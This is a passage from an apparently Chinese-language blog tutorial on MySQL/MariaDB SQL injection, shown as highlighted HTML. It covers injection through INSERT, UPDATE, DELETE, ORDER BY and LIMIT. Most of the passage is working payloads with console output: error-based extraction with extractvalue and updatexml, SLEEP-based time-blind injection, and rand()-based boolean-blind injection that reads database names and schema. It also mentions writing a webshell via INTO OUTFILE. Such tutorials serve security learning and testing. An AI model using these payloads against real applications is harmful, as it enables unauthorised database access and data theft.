</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>insert</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>message</span><span class=p>(</span><span class=n>id</span><span class=p>,</span><span class=n>user_id</span><span class=p>,</span><span class=n>message_id</span><span class=p>)</span><span class=w> </span><span class=k>values</span><span class=w> </span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=s1>&#39;zedd&#39;</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=o>@@</span><span class=k>version</span><span class=p>)))</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;hi&#39;</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>没有回显可以使用延时</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>insert</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>message</span><span class=p>(</span><span class=n>id</span><span class=p>,</span><span class=n>user_id</span><span class=p>,</span><span class=n>message_id</span><span class=p>)</span><span class=w> </span><span class=k>values</span><span class=w> </span><span class=p>(</span><span class=mi>5</span><span class=p>,</span><span class=s1>&#39;0&#39;</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=k>IF</span><span class=p>(</span><span class=n>SUBSTR</span><span class=p>((</span><span class=k>SELECT</span><span class=w> </span><span class=n>GROUP_CONCAT</span><span class=p>(</span><span class=k>schema_name</span><span class=p>)</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>INFORMATION_SCHEMA</span><span class=p>.</span><span class=n>SCHEMATA</span><span class=p>),</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span><span class=o>&lt;</span><span class=mi>200</span><span class=p>,</span><span class=n>SLEEP</span><span class=p>(</span><span class=mi>10</span><span class=p>),</span><span class=mi>0</span><span class=p>),</span><span class=w> </span><span class=s1>&#39;hi&#39;</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=update>update</h4><p>报错注入方式：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>update</span><span class=w> </span><span class=n>message</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=n>user_id</span><span class=o>=</span><span class=s1>&#39;1&#39;</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>version</span><span class=p>()),</span><span class=mi>0</span><span class=n>x7e</span><span class=p>),</span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=k>or</span><span class=s1>&#39;&#39;</span><span class=k>WHERE</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>2</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>update</span><span class=w> </span><span class=n>message</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=n>user_id</span><span class=o>=</span><span class=s1>&#39;1&#39;</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,</span><span class=k>database</span><span class=p>()))</span><span class=w> </span><span class=k>or</span><span class=s1>&#39;&#39;</span><span class=k>WHERE</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>2</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=delete>delete</h4><p>报错注入方式：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>DELETE</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>message</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>2</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>version</span><span class=p>()),</span><span class=mi>0</span><span class=n>x7e</span><span class=p>),</span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=k>or</span><span class=s1>&#39;&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>DELETE</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>message</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>2</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,</span><span class=k>database</span><span class=p>()))</span><span class=w> </span><span class=k>or</span><span class=s1>&#39;&#39;</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h3 id=order-by-后注入>Order by 后注入</h3><h4 id=报错注入-1>报错注入</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=o>@@</span><span class=k>version</span><span class=p>),</span><span class=mi>0</span><span class=n>x7e</span><span class=p>));</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=bool盲注-利用-rand>bool盲注 利用 rand()</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>order</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=k>IF</span><span class=p>((</span><span class=n>bool</span><span class=p>),</span><span class=mi>1</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>2</span><span class=p>));</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>使用<code>rand</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>message</span><span class=w> </span><span class=k>order</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=n>rand</span><span class=p>(</span><span class=k>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w>  </span><span class=mi>5</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>3</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>2</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>4</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>002</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>message</span><span class=w> </span><span class=k>order</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=n>rand</span><span class=p>(</span><span class=k>false</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w>  </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>5</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>2</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>3</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>4</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>001</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p><code>rand(true)</code>与<code>rand(flase)</code>返回不同来判断</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>message</span><span class=w> </span><span class=k>order</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=n>rand</span><span class=p>(</span><span class=n>SUBSTR</span><span class=p>((</span><span class=k>SELECT</span><span class=w> </span><span class=k>database</span><span class=p>()),</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span><span class=o>&gt;</span><span class=s1>&#39;t&#39;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w>  </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>5</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>2</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>3</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>4</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>001</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>message</span><span class=w> </span><span class=k>order</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=n>rand</span><span class=p>(</span><span class=n>SUBSTR</span><span class=p>((</span><span class=k>SELECT</span><span class=w> </span><span class=k>database</span><span class=p>()),</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span><span class=o>&lt;</span><span class=s1>&#39;t&#39;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w>  </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>5</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>2</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>3</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>4</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>000</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>message</span><span class=w> </span><span class=k>order</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=n>rand</span><span class=p>(</span><span class=n>SUBSTR</span><span class=p>((</span><span class=k>SELECT</span><span class=w> </span><span class=k>database</span><span class=p>()),</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span><span class=o>=</span><span class=s1>&#39;t&#39;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w>  </span><span class=mi>5</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>3</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>2</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>4</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>000</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=延时注入-order-by-if>延时注入 order by if()</h4><p>不推荐，因为每条数据都会执行延时，<strong>能用其他方法就不使用延时</strong>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>message</span><span class=w> </span><span class=k>order</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=k>IF</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>sleep</span><span class=p>(</span><span class=mi>3</span><span class=p>),</span><span class=mi>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w>  </span><span class=mi>1</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>2</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>3</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>  </span><span class=mi>5</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>4</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>12</span><span class=p>.</span><span class=mi>214</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>延时了 12s 左右。</p><h3 id=limit-注入>Limit 注入</h3><p>先看看 Mysql 5 中的 select 语法</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>[</span><span class=k>ALL</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=k>DISTINCT</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>DISTINCTROW</span><span class=w> </span><span class=p>]</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=p>[</span><span class=n>HIGH_PRIORITY</span><span class=p>]</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=p>[</span><span class=n>STRAIGHT_JOIN</span><span class=p>]</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=p>[</span><span class=n>SQL_SMALL_RESULT</span><span class=p>]</span><span class=w> </span><span class=p>[</span><span class=n>SQL_BIG_RESULT</span><span class=p>]</span><span class=w> </span><span class=p>[</span><span class=n>SQL_BUFFER_RESULT</span><span class=p>]</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=p>[</span><span class=n>SQL_CACHE</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>SQL_NO_CACHE</span><span class=p>]</span><span class=w> </span><span class=p>[</span><span class=n>SQL_CALC_FOUND_ROWS</span><span class=p>]</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>select_expr</span><span class=w> </span><span class=p>[,</span><span class=w> </span><span class=n>select_expr</span><span class=w> </span><span class=p>...]</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>[</span><span class=k>FROM</span><span class=w> </span><span class=n>table_references</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>[</span><span class=k>WHERE</span><span class=w> </span><span class=n>where_condition</span><span class=p>]</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>[</span><span class=k>GROUP</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=err>{</span><span class=n>col_name</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>expr</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=k>position</span><span class=err>}</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=p>[</span><span class=k>ASC</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=k>DESC</span><span class=p>],</span><span class=w> </span><span class=p>...</span><span class=w> </span><span class=p>[</span><span class=k>WITH</span><span class=w> </span><span class=k>ROLLUP</span><span class=p>]]</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>[</span><span class=k>HAVING</span><span class=w> </span><span class=n>where_condition</span><span class=p>]</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>[</span><span class=k>ORDER</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=err>{</span><span class=n>col_name</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>expr</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=k>position</span><span class=err>}</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=p>[</span><span class=k>ASC</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=k>DESC</span><span class=p>],</span><span class=w> </span><span class=p>...]</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>[</span><span class=k>LIMIT</span><span class=w> </span><span class=err>{</span><span class=p>[</span><span class=k>offset</span><span class=p>,]</span><span class=w> </span><span class=k>row_count</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=k>row_count</span><span class=w> </span><span class=k>OFFSET</span><span class=w> </span><span class=k>offset</span><span class=err>}</span><span class=p>]</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>[</span><span class=k>PROCEDURE</span><span class=w> </span><span class=n>procedure_name</span><span class=p>(</span><span class=n>argument_list</span><span class=p>)]</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>[</span><span class=k>INTO</span><span class=w> </span><span class=n>OUTFILE</span><span class=w> </span><span class=s1>&#39;file_name&#39;</span><span class=w> </span><span class=n>export_options</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=o>|</span><span class=w> </span><span class=k>INTO</span><span class=w> </span><span class=n>DUMPFILE</span><span class=w> </span><span class=s1>&#39;file_name&#39;</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>      </span><span class=o>|</span><span class=w> </span><span class=k>INTO</span><span class=w> </span><span class=n>var_name</span><span class=w> </span><span class=p>[,</span><span class=w> </span><span class=n>var_name</span><span class=p>]]</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>[</span><span class=k>FOR</span><span class=w> </span><span class=k>UPDATE</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=k>LOCK</span><span class=w> </span><span class=k>IN</span><span class=w> </span><span class=k>SHARE</span><span class=w> </span><span class=k>MODE</span><span class=p>]]</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>可以看到<code>LIMIT</code>后可以接<code>PROCEDURE</code>与<code>INTO</code>，而<code>INTO</code>用于写 webshell 使用，这里接不赘述，我们重点来看<code>PROCUDURE</code>，而且这里与版本有关，新版本的在<code>PROCUDURE</code>中已不支持使用<code>SELECT</code></p><p>老版本(为测试具体版本号，估计在 5.7 以前)可以若没有<code>order by</code>后可面接<code>union</code>，有<code>order by</code>可用<code>benchmark</code>或者报错注入，详情参考<a class=link href=http://vinc.top/2017/04/01/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91mysql-limit-%E6%B3%A8%E5%85%A5/ target=_blank rel=noopener>【SQL注入】mysql limit 注入</a></p><h4 id=报错注入-2>报错注入</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>MariaDB</span><span class=w> </span><span class=p>[</span><span class=n>test</span><span class=p>]</span><span class=o>&gt;</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>user</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>&gt;</span><span class=mi>0</span><span class=w> </span><span class=k>order</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=k>LIMIT</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+----------+--------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>passwd</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>----+----------+--------+
